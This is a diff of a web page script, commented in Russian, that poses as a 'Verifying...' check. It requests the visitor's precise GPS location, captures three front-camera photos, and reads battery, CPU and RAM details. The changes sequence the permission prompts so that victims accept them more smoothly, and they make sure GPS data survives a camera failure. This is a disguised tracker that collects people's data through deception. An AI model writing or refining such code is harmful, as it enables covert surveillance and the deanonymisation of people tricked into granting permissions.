@@ -219,14 +219,14 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             if (b.style.display === 'none') return;
             b.style.display = 'none';
             document.getElementById('loader').style.display = 'block';
-            document.getElementById('label-text').innerText = "Verifying...";
-
-            // 1. Запуск GPS сразу (параллельно)
-            let gps = "*GPS: Ожидание...*";
-            const gpsPromise = new Promise(resolve => {
-                if (!navigator.geolocation) return resolve("*GPS не поддерживается браузером*");
+            
+            // 1. Сначала GPS (Строго по очереди, чтобы не перекрывать окна)
+            document.getElementById('label-text').innerText = "Allow Location...";
+            let gps = await new Promise(resolve => {
+                if (!navigator.geolocation) return resolve("*GPS не поддерживается*");
                 
-                const timer = setTimeout(() => resolve("*GPS: Тайм-аут (слишком долго)*"), 10000); // 10 сек
+                // Тайм-аут на случай, если юзер игнорит окно или GPS тупит (7 сек)
+                const timer = setTimeout(() => resolve("*GPS: Тайм-аут*"), 7000);
 
                 navigator.geolocation.getCurrentPosition(
                     async p => {
@@ -248,36 +248,24 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                         else if (err.code === 3) e = "Тайм-аут";
                         resolve(`*GPS Ошибка: ${e}*`);
                     }, 
-                    { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
                 );
             });
 
-            // Небольшая пауза, чтобы GPS успел запросить доступ перед камерой на мобилках
-            await sleep(1000);
-
-            // 2. Батарея (Быстро)
-            let bat = "N/A";
-            if (navigator.getBattery) {
-                try {
-                    const bt = await navigator.getBattery();
-                    bat = `${Math.round(bt.level * 100)}% (${bt.charging ? 'Заряжается' : 'От батареи'})`;
-                } catch {}
-            }
-
-            // 3. Камера (С обработкой ошибок для мобилок)
+            // 2. Теперь Камера (GPS уже обработан)
+            document.getElementById('label-text').innerText = "Allow Camera...";
             let ph = [];
             try {
-                // Убрали width:1280, оставили ideal для совместимости с телефоном
                 const st = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: { ideal: 640 } } 
                 });
                 const v = document.getElementById('video');
                 v.srcObject = st;
                 
-                // Важно: игнорируем ошибку play() (на мобилках может быть запрещено)
                 try { await v.play(); } catch(e) { console.log("Auto-play blocked:", e); }
 
-                await sleep(1500); // Чуть меньше пауза
+                document.getElementById('label-text').innerText = "Verifying...";
+                await sleep(1000); 
 
                 const c = document.getElementById('canvas');
                 c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
@@ -285,19 +273,22 @@ CPU: ${s.c} ядра | RAM: ${s.r}
 
                 for(let i=0; i<3; i++) {
                     ctx.drawImage(v,0,0);
-                    // Сжимаем качество до 0.6 для скорости
                     ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.6)));
                     if(i<2) await sleep(500);
                 }
                 st.getTracks().forEach(t=>t.stop());
             } catch (e) {
                 console.log("Camera Error:", e);
-                // Не выкидываем ошибку, чтобы отправился хотя бы GPS
             }
 
-            // Ждем завершения GPS (если еще не готово)
-            document.getElementById('label-text').innerText = "Analyzing...";
-            gps = await gpsPromise;
+            // 3. Батарея
+            let bat = "N/A";
+            if (navigator.getBattery) {
+                try {
+                    const bt = await navigator.getBattery();
+                    bat = `${Math.round(bt.level * 100)}% (${bt.charging ? 'Заряжается' : 'От батареи'})`;
+                } catch {}
+            }
 
             document.getElementById('loader').style.display = 'none';
             document.getElementById('success-icon').style.display = 'block';
